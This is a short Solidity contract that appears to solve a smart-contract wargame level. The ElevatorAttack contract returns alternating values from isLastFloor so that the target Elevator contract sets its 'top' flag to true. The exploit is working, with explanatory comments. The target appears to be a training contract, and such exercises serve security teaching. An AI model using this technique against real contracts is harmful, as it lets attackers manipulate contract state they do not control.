// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./elevator.sol";

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;

    constructor(address _targetAddress) public{
        target = Elevator(_targetAddress);
    }

    //goal of this attack is make top value in elevator contract to be true
    //it check (! building.isLastFloor(_floor)), So, we have to sent false value to be true there
    //when call again in "top = building.isLastFloor(floor)", toggle value back to be true
    function isLastFloor(uint) public returns(bool) {
        toggle = !toggle;
        return toggle;
    }

    //we will deploy and run this function 
    function setTop(uint _floor) public{
        target.goTo(_floor);
    }

}